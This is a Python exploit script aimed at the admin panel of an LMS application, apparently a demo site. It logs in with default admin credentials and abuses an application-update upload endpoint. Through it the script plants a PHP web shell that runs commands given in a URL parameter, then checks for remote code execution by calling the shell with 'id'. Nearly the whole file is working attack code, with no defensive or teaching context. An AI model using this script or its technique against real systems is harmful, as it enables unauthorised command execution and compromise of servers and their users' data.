import requests
import zipfile
import io
import re
import os
import random
import string
import time

# Target URL
BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    try:
        r = session.get(url)
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
        return match.group(1) if match else None
    except:
        return None

def main():
    if not login():
        return

    # 1. Prepare malicious ZIP
    # The UpdateController unzips to base_path() (project root)
    # We want to place the shell in public/ so it's accessible via web
    shell_name = "root_shell.php"
    shell_content = "<?php system($_GET['c']); ?>"
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as z:
        # Note: public/ is usually a subdirectory in base_path()
        z.writestr(f"public/{shell_name}", shell_content)
    zip_buffer.seek(0)
    
    zip_filename = "update_payload.zip"
    
    # 2. Trigger basic-update
    print("[*] Triggering basic-update exploitation...")
    csrf = get_csrf(f"{BASE_URL}/admin/settings/update-app")
    if not csrf:
        print("[-] Could not find CSRF token for update page.")
        return
        
    payload = {
        '_token': csrf,
        'basic_update_confirm': 'on'
    }
    files = {
        'file': (zip_filename, zip_buffer, 'application/zip')
    }
    
    # POST to /admin/update/basic-update
    update_url = f"{BASE_URL}/admin/update/basic-update"
    r = session.post(update_url, data=payload, files=files)
    
    print(f"[*] Response Status: {r.status_code}")
    print(f"[*] Response Body: {r.text[:200]}")
    
    if r.status_code == 200:
        print("[+] Update triggered successfully!")
        
        # 3. Verify shell
        # Shell should be at BASE_URL/root_shell.php
        shell_url = f"{BASE_URL}/{shell_name}"
        print(f"[*] Verifying shell at: {shell_url}?c=id")
        
        # Adding a small delay for extraction
        time.sleep(3)
        
        try:
            res = session.get(shell_url + "?c=id", timeout=10)
            if res.status_code == 200 and ("uid=" in res.text or "apache" in res.text or "www-data" in res.text or "root" in res.text):
                print(f"[!!!!] RCE SUCCESS! Shell: {shell_url}?c=id")
                print(f"Output: {res.text.strip()}")
            else:
                print(f"[-] Shell check failed (Status: {res.status_code}). Content: {res.text[:100]}")
        except Exception as e:
            print(f"[-] Error during shell verification: {e}")
    else:
        print("[-] Update failed. Check permissions or CSRF.")

if __name__ == "__main__":
    main()
